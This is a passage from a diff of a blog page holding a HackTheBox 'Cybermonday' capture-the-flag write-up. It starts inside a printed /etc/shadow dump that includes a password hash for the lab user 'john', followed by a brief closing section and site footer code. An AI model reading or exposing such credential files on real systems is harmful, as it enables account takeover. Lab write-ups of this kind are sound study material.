class="line">lp:*:19506:0:99999:7:::</span><br><span class="line">mail:*:19506:0:99999:7:::</span><br><span class="line">news:*:19506:0:99999:7:::</span><br><span class="line">uucp:*:19506:0:99999:7:::</span><br><span class="line">proxy:*:19506:0:99999:7:::</span><br><span class="line">www-data:*:19506:0:99999:7:::</span><br><span class="line">backup:*:19506:0:99999:7:::</span><br><span class="line">list:*:19506:0:99999:7:::</span><br><span class="line">irc:*:19506:0:99999:7:::</span><br><span class="line">gnats:*:19506:0:99999:7:::</span><br><span class="line">nobody:*:19506:0:99999:7:::</span><br><span class="line">_apt:*:19506:0:99999:7:::</span><br><span class="line">systemd-network:*:19506:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19506:0:99999:7:::</span><br><span class="line">messagebus:*:19506:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19506:0:99999:7:::</span><br><span class="line">sshd:*:19506:0:99999:7:::</span><br><span class="line">john:$y$j9T<span class="variable">$GjbNtuqeiU3F8AVjXki</span>/F1<span class="variable">$E</span>.mwZgDhVYWBR8UfeQDDO91/Z8cGKOW.ec0iK9Xj017:19569:0:99999:7:::</span><br><span class="line">systemd-coredump:!*:19506::::::</span><br><span class="line">_laurel:!:19572::::::</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="最後"><a href="#最後" class="headerlink" title="最後"></a>最後</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231026200949-1jttzdj.png" alt="image">​</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&text=HackTheBox - Machine - Cybermonday"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&is_video=false&description=HackTheBox - Machine - Cybermonday"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Cybermonday&body=Check out this article: https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&title=HackTheBox - Machine - Cybermonday"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&name=HackTheBox - Machine - Cybermonday&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2023/10/26/2023-htb-machine/10-Cybermonday/&t=HackTheBox - Machine - Cybermonday"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
